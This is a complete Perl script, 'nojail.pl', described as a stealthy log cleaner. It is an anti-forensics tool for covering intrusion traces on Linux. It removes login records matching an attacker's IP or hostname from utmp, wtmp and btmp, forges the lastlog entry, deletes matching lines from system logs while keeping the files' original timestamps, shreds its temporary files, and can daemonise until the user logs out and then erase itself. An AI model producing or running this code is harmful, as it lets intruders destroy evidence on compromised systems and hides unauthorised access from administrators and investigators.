#!/usr/bin/env perl
#
# nojail.pl - Stealthy log file cleaner.
#
# Removes incriminating entries from utmp/wtmp/btmp, lastlog,
# and generic /var/log files based on IP, user, hostname, or regex.
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.

use strict;
use warnings;
use Getopt::Long qw(:config bundling);
use POSIX qw(strftime);
use Fcntl qw(:mode);
use File::stat;
use Socket qw(inet_aton AF_INET);

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

my @LINUX_UTMP_FILES       = qw(/var/run/utmp /var/log/wtmp /var/log/btmp);
my $LINUX_LASTLOG_FILE     = '/var/log/lastlog';
my @LINUX_ADDITIONAL_LOGS  = qw(/var/log/messages /var/log/secure);
my $UTMP_BLOCK_SIZE        = 384;
my $LASTLOG_BLOCK_SIZE     = 292;

# Keeps track of the latest "legitimate" login date for the user
my %LAST_LOGIN = ( timestamp => 0, terminal => '', hostname => '' );

my $VERBOSE    = 0;
my $CHECK_MODE = 0;
my $SAFE_MOUNTPOINT;

# ---------------------------------------------------------------------------
# Miscellaneous functions
# ---------------------------------------------------------------------------

sub random_string {
    my ($size) = @_;
    my @chars = ('a'..'z', '0'..'9');
    return join '', map { $chars[rand @chars] } 1 .. $size;
}

sub ask_confirmation {
    my ($message) = @_;
    print "[ ] $message " . orange("Confirm? [Y/n] ");
    my $response = <STDIN>;
    chomp $response;
    $response = lc($response);
    return 0 if $response eq 'n' || $response eq 'no';
    return 1;  # Default to yes
}

# ---------------------------------------------------------------------------
# Pretty printing
# ---------------------------------------------------------------------------

sub red     { "\033[91m$_[0]\033[0m" }
sub orange  { "\033[93m$_[0]\033[0m" }
sub green   { "\033[92m$_[0]\033[0m" }
sub error   { "[" . red("!") . "] " . red("Error: $_[0]") }
sub warning { "[" . orange("*") . "] Warning: $_[0]" }
sub success { "[" . green("*") . "] " . green($_[0]) }
sub info    { "[ ] $_[0]" }

# ---------------------------------------------------------------------------
# File manipulation functions
# ---------------------------------------------------------------------------

sub get_safe_mountpoint {
    return $SAFE_MOUNTPOINT if $SAFE_MOUNTPOINT;

    open my $fh, '-|', 'mount', '-t', 'tmpfs' or do {
        print error("Could not find a tmpfs mountpoint to work in! Aborting.\n");
        exit(-1);
    };
    my @candidates;
    while (<$fh>) {
        chomp;
        next unless /rw/;
        my @parts = split /\s+/, $_;
        my $device = $parts[2] // next;
        next unless $device =~ m{^/};
        next unless -w $device;

        # Check free space with stat (inode blocks)
        my $st = stat($device);
        next unless $st;
        # Use df to check for at least 1000 free blocks (1K blocks)
        open my $df, '-|', "df -P $device 2>/dev/null" or next;
        <$df>;  # skip header
        my $df_line = <$df>;
        close $df;
        next unless $df_line;
        my @df_parts = split /\s+/, $df_line;
        my $avail = $df_parts[3] || 0;
        next unless $avail >= 1000;

        $SAFE_MOUNTPOINT = $device;
        last;
    }
    close $fh;

    if ($SAFE_MOUNTPOINT) {
        print success("Identified $SAFE_MOUNTPOINT as a suitable working directory.\n") if $VERBOSE;
        return $SAFE_MOUNTPOINT;
    }
    print error("Could not find a tmpfs mountpoint to work in! Aborting.\n");
    exit(-1);
}

sub get_temp_filename {
    return get_safe_mountpoint() . '/' . random_string(10);
}

sub proper_overwrite {
    my ($source, $destination) = @_;
    unless (-e $source && -e $destination) {
        print error("Either $source or $destination does not exist! "
                  . "Logs have NOT been overwritten!\n");
        return 0;
    }
    unless (-w $destination) {
        print error("Cannot write to $destination! Logs have NOT been overwritten!\n");
        return 0;
    }

    my @stat = stat($destination);
    my $ret = system("cat $source > $destination");
    if ($ret != 0) {
        print warning("Command \"cat $source > $destination\" failed!\n") if $VERBOSE;
        return 0;
    }
    utime($stat[8], $stat[9], $destination);  # atime, mtime
    return 1;
}

sub secure_delete {
    my ($target) = @_;
    unless (-e $target) {
        print error("Tried to delete a nonexistent file! ($target)\n");
        return;
    }

    # Try shred first
    system("shred", "-uz", $target);
    return unless $?;  # Shred worked

    print warning("shred is not available. Falling back to manual secure file deletion.\n") if $VERBOSE;

    open my $fh, '+<', $target or return;
    my $length = -s $target;
    for (1 .. 3) {
        seek $fh, 0, 0;
        print $fh "\xff" x $length;
    }
    close $fh;
    unlink $target;
}

# ---------------------------------------------------------------------------
# UTMP cleaning
# ---------------------------------------------------------------------------

sub clean_utmp {
    my ($filename, $username, $ip, $hostname) = @_;

    unless (-e $filename) {
        print warning("$filename does not exist.\n");
        return;
    }

    open my $fh, '<:raw', $filename or do {
        print error("Unable to read $filename. Logfile will NOT be cleaned.\n");
        return;
    };

    my $cleaned = 0;
    my $clean_file = '';
    binmode $fh;

    my $buf;
    while (read $fh, $buf, $UTMP_BLOCK_SIZE) {
        last unless length $buf == $UTMP_BLOCK_SIZE;

        # Assert last 20 bytes are nulls
        my $unused = substr($buf, $UTMP_BLOCK_SIZE - 20, 20);
        unless ($unused eq "\x00" x 20) {
            print error("This distribution may not be using the expected UTMP block size. "
                      . "$filename will NOT be cleaned!\n");
            close $fh;
            return;
        }

        # Unpack: s(2) x2(2) i(4) Z32 Z4 Z32 Z256 s2 i3 x36
        # Offsets accounted for with manual padding
        my ($type, $pid, $line, $id, $user, $ut_host, @rest) =
            unpack 's x2 i Z32 Z4 Z32 Z256 s2 i3 x36', $buf;

        # Clean null bytes from strings
        $line =~ s/\x00.*$//;
        $id   =~ s/\x00.*$//;
        $user =~ s/\x00.*$//;
        $ut_host =~ s/\x00.*$//;

        my $timestamp = $rest[2];  # third int = tv_sec

        # Check if this entry matches the target
        if ($ut_host eq $hostname || $ut_host eq $ip) {
            my $delete = 1;
            if ($CHECK_MODE) {
                my $time_str = $timestamp ? strftime('%Y-%m-%d %H:%M:%S', localtime($timestamp)) : 'unknown';
                $delete = ask_confirmation(
                    "About to delete a record in $filename for a $user "
                  . "login from $ut_host on $time_str."
                );
            }
            if ($delete) {
                $cleaned++;
            } else {
                $clean_file .= $buf;
            }
        } else {
            # Track last real login (not btmp = last element)
            if ($filename ne $LINUX_UTMP_FILES[-1] && $user eq $username && $timestamp > $LAST_LOGIN{timestamp}) {
                %LAST_LOGIN = ( timestamp => $timestamp, terminal => $line, hostname => $ut_host );
            }
            $clean_file .= $buf;
        }
    }
    close $fh;

    if ($cleaned == 0) {
        print info("No entries to remove from $filename.\n");
    } else {
        my $tmp_file = get_temp_filename();
        open my $gfh, '>:raw', $tmp_file or die "Cannot write $tmp_file: $!";
        print $gfh $clean_file;
        close $gfh;
        if (proper_overwrite($tmp_file, $filename)) {
            print success("$cleaned entries removed from $filename!\n");
        }
        secure_delete($tmp_file);
    }
}

# ---------------------------------------------------------------------------
# LASTLOG cleaning
# ---------------------------------------------------------------------------

sub clean_lastlog {
    my ($filename, $username, $ip, $hostname) = @_;

    unless (-e $filename) {
        print warning("$filename does not exist.\n");
        return;
    }

    open my $fh, '<:raw', $filename or do {
        print error("Unable to read $filename.\n");
        return;
    };
    binmode $fh;

    my $uid = (getpwnam($username))[2];
    unless (defined $uid) {
        print error("Unknown user $username.\n");
        close $fh; return;
    }

    # Seek to the user's block
    read $fh, my $buf, $uid * $LASTLOG_BLOCK_SIZE;  # skip preceding blocks

    read $fh, $buf, $LASTLOG_BLOCK_SIZE;
    return unless length $buf == $LASTLOG_BLOCK_SIZE;

    my ($ll_time, $ll_line, $ll_host) = unpack 'i Z32 Z256', $buf;
    $ll_line =~ s/\x00.*$//;
    $ll_host =~ s/\x00.*$//;

    # Nothing to do if last login isn't from target IP/host
    unless ($ll_host eq $hostname || $ll_host eq $ip) {
        close $fh;
        return;
    }

    if ($CHECK_MODE) {
        my $time_str = $ll_time ? strftime('%Y-%m-%d %H:%M:%S', localtime($ll_time)) : 'never';
        return unless ask_confirmation(
            "About to modify the following $filename record: latest login from "
          . "$username ($ll_host): $time_str."
        );
    }

    # Read the rest of the file
    my $rest;
    read $fh, $rest, 1024 * 1024;  # Read up to 1MB more
    close $fh;

    # Build replacement block
    my $replacement;
    if ($LAST_LOGIN{timestamp} == 0) {
        $replacement = "\x00" x $LASTLOG_BLOCK_SIZE;
    } else {
        $replacement = pack 'i Z32 Z256',
            $LAST_LOGIN{timestamp},
            $LAST_LOGIN{terminal},
            $LAST_LOGIN{hostname};
    }

    # Re-read original to get full file
    open $fh, '<:raw', $filename or die "Cannot re-read $filename: $!";
    binmode $fh;
    read $fh, my $full, 1048576;  # Read up to 1MB
    close $fh;

    # Build new contents
    my $clean_file = substr($full, 0, $uid * $LASTLOG_BLOCK_SIZE);
    $clean_file .= $replacement;
    $clean_file .= substr($full, ($uid + 1) * $LASTLOG_BLOCK_SIZE);

    my $tmp_file = get_temp_filename();
    open my $gfh, '>:raw', $tmp_file or die "Cannot write $tmp_file: $!";
    print $gfh $clean_file;
    close $gfh;

    my $success_flag = proper_overwrite($tmp_file, $filename);
    secure_delete($tmp_file);
    return unless $success_flag;

    if ($LAST_LOGIN{timestamp} != 0) {
        my $ts = strftime('%Y-%m-%d %H:%M:%S', localtime($LAST_LOGIN{timestamp}));
        print success("Lastlog set to $ts from $LAST_LOGIN{terminal} at $LAST_LOGIN{hostname}\n");
    } else {
        print success("Removed $username's login information from lastlog!\n");
    }
}

# ---------------------------------------------------------------------------
# Generic log cleaning
# ---------------------------------------------------------------------------

sub clean_generic_logs {
    my ($files, $ip, $hostname, $regexp) = @_;
    my %targets;

    # Find log files in /var
    open my $fh, '-|', 'find', '/var', '-regextype', 'posix-egrep',
        '-regex', '.*(\.|/sys)log(\.[0-9]+)?(\.gz)?$', '-type', 'f'
        or warn "find command failed: $!";

    while (<$fh>) {
        chomp;
        $targets{$_} = 1;
    }
    close $fh;

    # Add additional logs
    for my $f (@LINUX_ADDITIONAL_LOGS) {
        $targets{$f} = 1;
    }

    # Process user-specified files and directories
    for my $f (@$files) {
        if (-d $f) {
            opendir my $dh, $f or next;
            while (my $entry = readdir $dh) {
                next if $entry =~ /^\.\.?$/;
                my $path = "$f/$entry";
                $targets{$path} = 1 unless -d $path;
            }
            closedir $dh;
        } else {
            $targets{$f} = 1;
        }
    }

    for my $log (sort keys %targets) {
        next unless -e $log;
        unless (-r $log && -w $log) {
            print warning("Unable to read or write to $log! Skipping...\n") if $VERBOSE;
            next;
        }

        my $cleaned = 0;
        my $tmp_file = get_temp_filename();
        my $is_gz = $log =~ /\.gz$/;

        # Open input
        my $infh;
        if ($is_gz) {
            open $infh, '-|', 'gzip', '-dc', $log or next;
        } else {
            open $infh, '<:utf8', $log or next;
        }

        # Open output
        my $outfh;
        if ($is_gz) {
            open $outfh, '|-', 'gzip', '-c', '>', $tmp_file or next;
        } else {
            open $outfh, '>:utf8', $tmp_file or next;
        }

        while (my $line = <$infh>) {
            if ($line =~ /\Q$ip\E/ || $line =~ /\Q$hostname\E/ || ($regexp && $line =~ /$regexp/)) {
                if ($CHECK_MODE) {
                    my $keep = !ask_confirmation("About to delete the following line from $log:\n$line.");
                    print $outfh $line if $keep;
                }
                $cleaned++ unless $CHECK_MODE;
            } else {
                print $outfh $line;
            }
        }
        close $infh;
        close $outfh;

        if ($cleaned == 0) {
            print info("No entries to remove found in $log.\n") if $VERBOSE || grep { $_ eq $log } @$files;
            secure_delete($tmp_file);
        } else {
            if (proper_overwrite($tmp_file, $log)) {
                print success("$cleaned lines removed from $log!\n");
            }
            secure_delete($tmp_file);
        }
    }
}

# ---------------------------------------------------------------------------
# Daemonization
# ---------------------------------------------------------------------------

sub daemonize {
    $| = 1;  # Flush stdout

    my $pid = fork();
    return if $pid > 0;        # Parent exits
    die "fork: $!" unless defined $pid;

    chdir '/';
    POSIX::setsid();
    umask(0);

    $pid = fork();
    exit(0) if $pid > 0;       # First child exits
    exit(1) unless defined $pid;

    print success("The script has daemonized successfully.\n");
    $| = 1;

    # Wait for session to end by checking stdout's TTY
    while (1) {
        sleep 10;
        if (! -c '/dev/stdout' && ! -t STDOUT) {
            sleep 50;
            return;
        }
        # Also try ttyname check
        eval { my $tty = POSIX::ttyname(fileno(STDOUT)); 1; };
        unless ($@) {
            # ttyname succeeded, stdout exists
        } else {
            sleep 50;
            return;
        }
    }
}

# ---------------------------------------------------------------------------
# Argument validation
# ---------------------------------------------------------------------------

sub validate_args {
    my ($args) = @_;
    $VERBOSE = $args->{verbose};

    # Username from environment if not given
    unless ($args->{user}) {
        $args->{user} = $ENV{USER} || do {
            print error("Could not determine the username. Please specify it with the -u option.\n");
            exit(1);
        };
    }

    # IP from environment if not given
    unless ($args->{ip}) {
        if ($ENV{SSH_CONNECTION}) {
            $args->{ip} = (split /\s+/, $ENV{SSH_CONNECTION})[0];
        } else {
            print error("Could not determine the IP address. Please specify it with the -i option.\n");
            exit(1);
        }
    }

    # Validate regex
    if ($args->{regexp}) {
        eval { qr/$args->{regexp}/ };
        if ($@) {
            print error("The regular expression specified is invalid.\n");
            exit(1);
        }
    }

    # Determine hostname
    unless ($args->{hostname}) {
        my @host = gethostbyaddr(inet_aton($args->{ip}), AF_INET);
        unless (@host) {
            print error("Could not determine the hostname. Please specify it with the -n option.\n");
            exit(1);
        }
        $args->{hostname} = $host[0];
    }

    # Check mode validation
    if ($args->{check}) {
        unless (-t STDIN) {
            print error("Cannot ask for confirmation without a TTY. Please rerun without --check.\n");
            exit(1);
        }
        if ($args->{daemonize}) {
            print error("The --check option is incompatible with --daemonize.\n");
            exit(1);
        }
        $CHECK_MODE = 1;
    }

    # Validate log files
    if ($args->{log_files}) {
        for my $log (@{$args->{log_files}}) {
            unless (-e $log) {
                print error("$log does not exist!\n");
                exit(1);
            }
            unless (-r $log && -w $log) {
                print error("$log is not readable and/or not writable!\n");
                exit(1);
            }
        }
    }

    if ($args->{daemonize}) {
        unless (-t STDIN) {
            print warning("Cannot detect session termination without a TTY! The script will automatically "
                        . "start in 60 seconds. Make sure you log out before then, or run the script again later.\n");
        }
        daemonize();
    }
}

# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

sub main {
    my %args;
    $args{log_files} = [];

    GetOptions(
        'user|u=s'      => \$args{user},
        'ip|i=s'        => \$args{ip},
        'regexp|r=s'    => \$args{regexp},
        'hostname|n=s'  => \$args{hostname},
        'verbose|v'     => \$args{verbose},
        'check|c'       => \$args{check},
        'daemonize|d'   => \$args{daemonize},
    ) or exit 1;

    $args{log_files} = \@ARGV;

    validate_args(\%args);
    print info("Cleaning logs for $args{user} ($args{ip} - $args{hostname}).\n");

    get_safe_mountpoint();

    # Clean UTMP files (Linux only)
    if ($^O eq 'linux') {
        for my $log (@LINUX_UTMP_FILES) {
            clean_utmp($log, $args{user}, $args{ip}, $args{hostname});
        }
        clean_lastlog($LINUX_LASTLOG_FILE, $args{user}, $args{ip}, $args{hostname});
    } else {
        print error("UTMP/WTMP/lastlog cannot be cleaned on $^O :(\n");
    }

    clean_generic_logs($args{log_files}, $args{ip}, $args{hostname}, $args{regexp});

    # Self-delete if daemonized
    if ($args{daemonize}) {
        my $script = $0;
        secure_delete($script) if -e $script;
        my $basename = (split /\//, $script)[-1];
        secure_delete($basename) if -e $basename;
    }
}

main() unless $ENV{FFPL_NO_RUN} || caller;
1;
